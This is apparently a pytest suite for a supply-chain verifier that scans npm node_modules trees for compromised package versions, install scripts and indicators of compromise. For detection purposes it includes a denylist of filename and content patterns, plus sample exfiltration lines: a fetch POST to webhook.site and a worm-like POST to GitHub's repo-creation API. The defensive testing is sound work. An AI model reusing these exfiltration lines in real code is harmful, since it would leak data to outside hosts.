# Creado por Aldo Garcia.
"""Verificacion de cadena de suministro.

Un control que nunca dispara no vale nada: estas pruebas construyen arboles
``node_modules`` sinteticos con un paquete comprometido, un script de
instalacion y un indicador de exfiltracion, y comprueban que el verificador los
detecta. Tambien comprueban que un arbol limpio pasa.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
import yaml

from scripts import verify_supply_chain as vsc

pytestmark = [pytest.mark.security, pytest.mark.unit]

PROJECT_ROOT = Path(__file__).resolve().parents[3]

DENYLIST = {
    "version": 1,
    "incidents": [
        {
            "id": "PRUEBA-2026",
            "packages": [
                {"name": "keyv", "versions": ["6.0.0"]},
                {"name": "cache-manager", "versions": ["7.2.10"]},
                {"name": "paquete-siempre-malo", "versions": "*"},
            ],
        }
    ],
    "indicators": {
        "filenames": ["shai-hulud*", "*trufflehog*"],
        "content_patterns": ["webhook\\.site", "api\\.github\\.com/user/repos"],
    },
}


def crear_paquete(
    node_modules: Path, nombre: str, version: str, *, scripts: dict | None = None
) -> Path:
    destino = node_modules / nombre
    destino.mkdir(parents=True, exist_ok=True)
    manifiesto = {"name": nombre, "version": version}
    if scripts:
        manifiesto["scripts"] = scripts
    (destino / "package.json").write_text(json.dumps(manifiesto), encoding="utf-8")
    return destino


@pytest.fixture()
def arbol(tmp_path: Path, monkeypatch):  # noqa: ANN001, ANN201
    """Arbol node_modules sintetico apuntado por el verificador."""
    frontend = tmp_path / "frontend"
    node_modules = frontend / "node_modules"
    node_modules.mkdir(parents=True)

    (frontend / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'\n", encoding="utf-8")
    (frontend / "package.json").write_text(
        json.dumps({"packageManager": "pnpm@9.15.9+sha512." + "a" * 128}), encoding="utf-8"
    )
    (frontend / ".npmrc").write_text("ignore-scripts=true\n", encoding="utf-8")

    denylist_path = tmp_path / "denylist.yaml"
    denylist_path.write_text(yaml.safe_dump(DENYLIST), encoding="utf-8")

    monkeypatch.setattr(vsc, "FRONTEND", frontend)
    monkeypatch.setattr(vsc, "NODE_MODULES", node_modules)
    monkeypatch.setattr(vsc, "DENYLIST_PATH", denylist_path)
    return node_modules


class TestListaDeBloqueo:
    def test_un_arbol_limpio_pasa(self, arbol: Path):
        crear_paquete(arbol, "react", "18.3.1")
        crear_paquete(arbol, "vite", "8.2.1")

        report = vsc.run()
        assert report.ok is True
        assert report.checks["lista_de_bloqueo"] == "OK"
        assert report.checked_packages == 2

    def test_detecta_la_version_comprometida(self, arbol: Path):
        crear_paquete(arbol, "react", "18.3.1")
        crear_paquete(arbol, "keyv", "6.0.0")

        report = vsc.run()
        assert report.ok is False
        bloqueantes = [f.detail for f in report.blocking]
        assert any("keyv@6.0.0" in d for d in bloqueantes)

    def test_una_version_sana_del_mismo_paquete_no_dispara(self, arbol: Path):
        """No basta con el nombre: solo la version comprometida es un hallazgo."""
        crear_paquete(arbol, "keyv", "5.3.1")

        report = vsc.run()
        assert report.ok is True

    def test_detecta_un_paquete_anidado_en_profundidad(self, arbol: Path):
        """El paquete comprometido suele ser una dependencia transitiva."""
        profundo = arbol / "vite" / "node_modules" / "algo" / "node_modules"
        profundo.mkdir(parents=True)
        crear_paquete(arbol, "vite", "8.2.1")
        crear_paquete(profundo, "cache-manager", "7.2.10")

        report = vsc.run()
        assert report.ok is False
        assert any("cache-manager@7.2.10" in f.detail for f in report.blocking)

    def test_el_comodin_bloquea_cualquier_version(self, arbol: Path):
        crear_paquete(arbol, "paquete-siempre-malo", "0.0.1")

        report = vsc.run()
        assert report.ok is False


class TestScriptsDeInstalacion:
    def test_detecta_un_postinstall(self, arbol: Path):
        crear_paquete(arbol, "sospechoso", "1.0.0", scripts={"postinstall": "node malo.js"})

        report = vsc.run()
        avisos = [f for f in report.findings if f.kind == "script_de_instalacion"]
        assert len(avisos) == 1
        assert "sospechoso@1.0.0" in avisos[0].detail
        # Es aviso, no bloqueante: con ignore-scripts=true no llega a ejecutarse.
        assert report.ok is True

    def test_detecta_preinstall_e_install(self, arbol: Path):
        crear_paquete(arbol, "a", "1.0.0", scripts={"preinstall": "x"})
        crear_paquete(arbol, "b", "1.0.0", scripts={"install": "y"})

        report = vsc.run()
        assert len([f for f in report.findings if f.kind == "script_de_instalacion"]) == 2

    def test_un_paquete_permitido_explicitamente_no_es_aviso(self, arbol: Path):
        crear_paquete(arbol, "esbuild", "0.24.2", scripts={"postinstall": "node install.js"})

        report = vsc.run(allowed_script_packages={"esbuild"})
        assert [f.kind for f in report.findings] == ["script_de_instalacion_permitido"]

    def test_un_script_normal_no_dispara(self, arbol: Path):
        """`build` o `test` no son vectores de instalacion."""
        crear_paquete(arbol, "normal", "1.0.0", scripts={"build": "tsc", "test": "vitest"})

        report = vsc.run()
        assert not [f for f in report.findings if f.kind == "script_de_instalacion"]


class TestIndicadoresDeCompromiso:
    def test_detecta_un_nombre_de_archivo_sospechoso(self, arbol: Path):
        paquete = crear_paquete(arbol, "victima", "1.0.0")
        (paquete / "shai-hulud.yaml").write_text("on: push\n", encoding="utf-8")

        report = vsc.run()
        assert report.ok is False
        assert any(f.kind == "ioc_nombre_de_archivo" for f in report.blocking)

    def test_detecta_exfiltracion_por_contenido(self, arbol: Path):
        paquete = crear_paquete(arbol, "victima", "1.0.0")
        (paquete / "index.js").write_text(
            "fetch('https://webhook.site/abc', {method:'POST'})", encoding="utf-8"
        )

        report = vsc.run()
        assert report.ok is False
        assert any(f.kind == "ioc_contenido" for f in report.blocking)

    def test_detecta_creacion_de_repositorios(self, arbol: Path):
        paquete = crear_paquete(arbol, "victima", "1.0.0")
        (paquete / "worm.js").write_text(
            "await fetch('https://api.github.com/user/repos', {method:'POST'})", encoding="utf-8"
        )

        report = vsc.run()
        assert report.ok is False

    def test_un_codigo_normal_no_dispara(self, arbol: Path):
        paquete = crear_paquete(arbol, "normal", "1.0.0")
        (paquete / "index.js").write_text(
            "export function suma(a, b) { return a + b; }", encoding="utf-8"
        )

        report = vsc.run()
        assert report.ok is True


class TestInstalacionReproducible:
    def test_wamp_no_publica_el_arbol_fuente(self):
        protection = (PROJECT_ROOT / ".htaccess").read_text(encoding="utf-8").lower()
        assert "require all denied" in protection
        assert "deny from all" in protection

    def test_exige_lockfile(self, arbol: Path):
        (vsc.FRONTEND / "pnpm-lock.yaml").unlink()

        report = vsc.run()
        assert report.ok is False
        assert any(f.kind == "sin_lockfile" for f in report.blocking)

    def test_exige_ignore_scripts(self, arbol: Path):
        (vsc.FRONTEND / ".npmrc").write_text("fund=false\n", encoding="utf-8")

        report = vsc.run()
        assert report.ok is False
        assert any(f.kind == "scripts_de_instalacion_habilitados" for f in report.blocking)

    def test_sin_npmrc_tambien_falla(self, arbol: Path):
        (vsc.FRONTEND / ".npmrc").unlink()

        report = vsc.run()
        assert report.ok is False


class TestIntegridadDelGestor:
    """`packageManager` (corepack) debe fijar pnpm con hash de integridad."""

    def test_con_hash_es_ok(self, arbol: Path):
        (vsc.FRONTEND / "package.json").write_text(
            json.dumps({"packageManager": "pnpm@9.15.9+sha512." + "a" * 128}), encoding="utf-8"
        )
        pm, con_hash = vsc.package_manager_pin()
        assert con_hash is True
        # No aporta hallazgos: el gestor esta correctamente fijado.
        report = vsc.Report()
        vsc.check_package_manager_pin(report)
        assert not any(
            f.kind in ("gestor_sin_hash_integridad", "gestor_no_fijado")
            for f in report.findings
        )

    def test_sin_hash_avisa_pero_no_bloquea(self, arbol: Path):
        (vsc.FRONTEND / "package.json").write_text(
            '{"packageManager": "pnpm@9.15.9"}', encoding="utf-8"
        )
        pm, con_hash = vsc.package_manager_pin()
        assert (pm, con_hash) == ("pnpm@9.15.9", False)
        report = vsc.Report()
        vsc.check_package_manager_pin(report)
        # Aviso visible, pero NO bloqueante en desarrollo.
        assert report.ok is True
        assert any(f.kind == "gestor_sin_hash_integridad" for f in report.findings)

    def test_ausente_avisa(self, arbol: Path):
        (vsc.FRONTEND / "package.json").write_text("{}", encoding="utf-8")
        pm, con_hash = vsc.package_manager_pin()
        assert (pm, con_hash) == ("", False)


class TestListaDeBloqueoReal:
    """La lista que se distribuye debe ser valida y cubrir el incidente reportado."""

    def test_el_archivo_del_proyecto_es_valido(self):
        denylist = vsc.load_denylist()
        assert denylist["version"] == 1
        assert denylist["incidents"]

    def test_cubre_los_paquetes_del_aviso(self):
        denylist = vsc.load_denylist()
        declarados = {
            entry["name"]
            for incident in denylist["incidents"]
            for entry in incident.get("packages", [])
        }
        esperados = {
            "keyv",
            "flat-cache",
            "file-entry-cache",
            "ecto",
            "cacheable-request",
            "cacheable",
            "cache-manager",
            "@cacheable/memory",
            "@cacheable/node-cache",
            "@cacheable/utils",
        }
        assert esperados <= declarados

    def test_el_arbol_real_del_proyecto_esta_limpio(self):
        """Verificacion sobre el node_modules realmente instalado."""
        if not vsc.NODE_MODULES.is_dir():
            pytest.skip("frontend/node_modules no instalado en este entorno")
        report = vsc.run()
        assert report.ok is True, [f.detail for f in report.blocking]
